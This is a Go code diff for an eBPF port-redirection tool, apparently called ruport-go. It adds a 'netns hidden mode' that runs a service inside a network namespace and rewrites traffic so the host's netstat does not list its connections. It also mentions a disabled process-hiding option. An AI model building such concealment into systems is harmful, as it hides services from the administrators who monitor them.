@@ -6,12 +6,14 @@ package main
 
 import (
 	"bufio"
+	"encoding/binary"
 	"errors"
 	"flag"
 	"fmt"
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strconv"
 	"strings"
@@ -26,6 +28,7 @@ import (
 
 	"ruport-go/internal/bpf"
 	"ruport-go/internal/control"
+	"ruport-go/internal/netnsx"
 )
 
 // getCommonNetdevIfindex 自动获取网卡，等价于原 get__common_netdev_ifindex()：
@@ -198,16 +201,60 @@ func pollMessages(msgMap *ebpf.Map, routerMap *ebpf.Map, ctl *control.Controller
 	}
 }
 
+// ifaceIPv4 取网卡上第一个非回环 IPv4 地址（netns 模式下作为回包 SNAT 的源 IP）。
+func ifaceIPv4(ifindex int) (net.IP, error) {
+	iface, err := net.InterfaceByIndex(ifindex)
+	if err != nil {
+		return nil, err
+	}
+	addrs, err := iface.Addrs()
+	if err != nil {
+		return nil, err
+	}
+	for _, a := range addrs {
+		if ipn, ok := a.(*net.IPNet); ok {
+			if ip4 := ipn.IP.To4(); ip4 != nil && !ip4.IsLoopback() {
+				return ip4, nil
+			}
+		}
+	}
+	return nil, fmt.Errorf("no IPv4 address on interface index %d", ifindex)
+}
+
 func main() {
 	var (
 		ifaceName string
 		srvPort   int
 		bHidden   bool
+
+		// netns 隐藏模式（设计见 doc/design/01-netns-hidden-service.md）
+		netnsMode  bool
+		nsName     string
+		nsSubnet   string
+		execCmd    string
+		execDetach bool
+		nsDestroy  bool
 	)
 	flag.StringVar(&ifaceName, "i", "", "网络接口名称")
 	flag.IntVar(&srvPort, "p", 0, "服务端口(兼容保留，不参与逻辑)")
 	flag.BoolVar(&bHidden, "H", false, "隐藏进程(原版 pidhide 已禁用，此参数仅为兼容保留)")
+
+	flag.BoolVar(&netnsMode, "N", false, "启用 netns 隐藏模式（宿主 netstat 不显示隐藏连接）")
+	flag.StringVar(&nsName, "ns-name", "ruport_ns", "netns 隐藏模式：命名空间名称")
+	flag.StringVar(&nsSubnet, "ns-subnet", "10.0.0.0/24", "netns 隐藏模式：内网段（.1 网关 / .2 服务）")
+	flag.StringVar(&execCmd, "exec", "", "netns 隐藏模式：在命名空间内拉起的服务命令（空格切分，不走 shell）")
+	flag.BoolVar(&execDetach, "exec-detach", false, "服务不随 ruport 退出")
+	flag.BoolVar(&nsDestroy, "ns-destroy", false, "销毁 netns 与 veth 后退出")
 	flag.Parse()
+
+	// --ns-destroy：仅清理
+	if nsDestroy {
+		if err := netnsx.Destroy(nsName); err != nil {
+			log.Fatalf("destroy netns: %v", err)
+		}
+		log.Printf("netns %s destroyed", nsName)
+		return
+	}
 
 	// 原版仅在 -p 给出时校验端口范围
 	portGiven := false
@@ -243,6 +290,35 @@ func main() {
 		log.Fatalf("remove memlock: %v", err)
 	}
 
+	// netns 隐藏模式：命名空间/veth/路由/卸载设置就绪（幂等）
+	var nsInfo *netnsx.NS
+	var serviceCmd *exec.Cmd
+	if netnsMode {
+		_, subnet, err := net.ParseCIDR(nsSubnet)
+		if err != nil {
+			log.Fatalf("invalid -ns-subnet %q: %v", nsSubnet, err)
+		}
+		nsInfo, err = netnsx.Ensure(nsName, subnet)
+		if err != nil {
+			log.Fatalf("ensure netns: %v", err)
+		}
+		defer nsInfo.Close()
+		log.Printf("netns ready: %s, %s=%s(%s), %s=%s(%s)",
+			nsName, nsInfo.HostVeth, nsInfo.GatewayIP, "gw",
+			nsInfo.NsVeth, nsInfo.ServiceIP, "service")
+		// FORWARD 链为 DROP 的宿主会丢弃转发进 ns 的包（只提示，不自动改防火墙）
+		log.Print("hint: 若宿主 iptables/nftables FORWARD 链为 DROP，需自行放行 veth 转发")
+
+		if execCmd != "" {
+			cmd, err := netnsx.StartInNS(nsInfo.Fd, strings.Fields(execCmd))
+			if err != nil {
+				log.Fatalf("start service in netns: %v", err)
+			}
+			serviceCmd = cmd
+			log.Printf("service in netns: pid %d (%s)", cmd.Process.Pid, execCmd)
+		}
+	}
+
 	// load xdp
 	var xdpObjs bpf.XdpObjects
 	if err := bpf.LoadXdpObjects(&xdpObjs, nil); err != nil {
@@ -274,6 +350,24 @@ func main() {
 		log.Fatalf("load tc error: %v", err)
 	}
 
+	// netns 模式：注入 config_map（nativeip/hostip 为网络序原始位型，
+	// 与 BPF 侧 __be32 的内存语义一致）。未注入即传统端口改写模式。
+	if netnsMode {
+		hostIP, err := ifaceIPv4(ifindex)
+		if err != nil {
+			log.Fatalf("resolve host ip: %v", err)
+		}
+		cfg := bpf.TcConfig{
+			Nativeip: binary.BigEndian.Uint32(nsInfo.ServiceIP.To4()),
+			Hostip:   binary.BigEndian.Uint32(hostIP.To4()),
+		}
+		if err := tcObjs.ConfigMap.Put(uint32(0), &cfg); err != nil {
+			log.Fatalf("write config_map: %v", err)
+		}
+		log.Printf("netns mode active: DNAT dst -> %s, SNAT replies back to %s",
+			nsInfo.ServiceIP, hostIP)
+	}
+
 	// create a accept thread（伺服 goroutine）
 	ctl := control.New()
 	go waitWeakupWorker(xdpObjs.MessageMap, tcObjs.RouterMap, ctl)
@@ -282,6 +376,11 @@ func main() {
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGSEGV)
 	<-sigCh
+
+	// 服务生命周期默认绑定 ruport（--exec-detach 可分离）
+	if serviceCmd != nil && serviceCmd.Process != nil && !execDetach {
+		_ = serviceCmd.Process.Signal(syscall.SIGTERM)
+	}
 
 	tcAt.release()
 	xdpLink.Close()
